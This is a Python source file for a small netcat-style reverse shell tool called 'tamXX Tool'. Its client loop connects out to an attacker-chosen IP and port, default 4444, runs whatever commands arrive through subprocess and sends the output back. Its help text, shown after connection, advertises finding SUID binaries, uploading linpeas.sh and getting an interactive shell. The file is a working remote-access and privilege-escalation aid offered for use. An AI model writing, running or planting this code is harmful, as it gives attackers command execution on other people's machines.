#!/usr/bin/env python3

import socket
import sys, os
import threading
import time
import subprocess
import signal
import random

class netcat(object):
    clientHandler = False
    prompt = False
    port = 4444
    target = ""
    home = ""
    user = ""
    tag = ""
    value = 'local'
    bufferSize = 2**12



    def usage(self,value):
        if value == 'local':
            print("""
            tamXX Tool :\n
            [OPTIONS] :
            \t\t--target [IP]\t\t\t-     target
            \t\t-p , --port [PORT]\t\t\t-     port
            \t\t--prompt\t\t\t-     initialize prompt
            \t\t-h , --help\t\t\t-     get some help ;)
            """)
            sys.exit(0)
        elif value == 'rhost':
            print("""
                WE ARE ON ! WHAT CAN I DO ?
                [OPTIONS] :
                \t\tFirst, you can execute almost same commands like real shell!
                \t\thelp\t\tget some help ;)
                \t\tsuid\t\tget all suid binaries !
                \t\tlinpeas\t\tupload linpeas.sh on machine
                \t\tshell\t\tget full interactive shell
                """)




    def main(self):

        listArgs = " ".join(sys.argv[1:]).split('-')
        while ("" in listArgs):
            listArgs.remove("")
        newListArgs = []
        for arg in listArgs:
            arg = arg.replace(' ','%')
            newListArgs.append(arg)

        if not len(sys.argv[1:]):
            self.usage(self.value)

        for opt in newListArgs:
            #print(opt)
            if opt == "h%" or opt == "help%" or opt == "help" or opt == "h":
                self.usage(self.value)
            elif "p%" in opt or "port%" in opt:
                opts = opt.split("%")
                self.port = int(opts[1])
            elif "target%" in opt:
                opts = opt.split("%")
                self.target = opts[1]
            elif opt == "prompt%" or opt == "prompt":
                self.clientHandler = True
            else:
                print("ERROR")
                self.usage(self.value)

        if self.clientHandler:
            self.clientLoop()




    def clientLoop(self):
        global length
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.target,self.port))
        while True:
            recv = s.recv(self.bufferSize)
            recv = recv.decode('utf-8')
            if 'cd' in recv:
                recv = recv.split(' ')
                param = ''.join(recv[1:])
                try:
                    os.chdir(param)
                    s.send(os.getcwd().encode())
                except:
                    s.send(b"Error ! ")
            elif "exit" in recv or "quit" in recv:
                s.close()
                break
            elif 'whoami' in recv or "pwd" in recv:
                output = subprocess.getoutput(recv)
                s.send(output.encode())
            else:
                #print(recv)
                #res = self.bash_(recv)
                #print(res)
                #s.send(res.encode())



                output = recv+'\n\n'
                output = subprocess.getoutput(recv)+ '\n'
                s.send(output.encode())



                #CMD = subprocess.Popen(recv, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                #s.send(CMD.stdout.read())
                #s.send(CMD.stderr.read())




if __name__ == "__main__":
   ncat = netcat()
   ncat.main()
